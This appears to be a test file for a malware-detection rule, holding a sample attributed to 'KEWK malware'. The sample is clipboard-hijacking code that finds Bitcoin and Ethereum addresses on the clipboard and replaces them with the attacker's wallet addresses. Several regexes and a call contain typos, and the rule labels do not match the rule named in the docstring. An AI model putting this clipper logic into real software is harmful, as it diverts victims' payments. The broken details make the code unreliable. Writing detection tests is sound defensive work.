""" Tests for clipboard-search rule

    RULEID cases:
      - KEWK malware
    No Clear OK cases
"""

""" RULEID: KEWK malware
"""
pyperclip.copy('The text to be copied to the clipboard.')
# ruleid: download-executable
clipboard_data = pyperclip.paste()
if re.search('^[13][a-km-zA-HJ-NP-21-9]{25, 34}$', clipboard_data):
    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain]:
        if self.address_btc != "none":
            pyperclip.copy(self.address_btc)
            # ruleid: download-executable
            pyperclip.paste()
if re.search('^Ox[a-fA-FO-9](40)$', clipboard_data):
    pyperclip.copy(self.address_eth)
    # ruleid: download-executable
    pyperclip-paste()
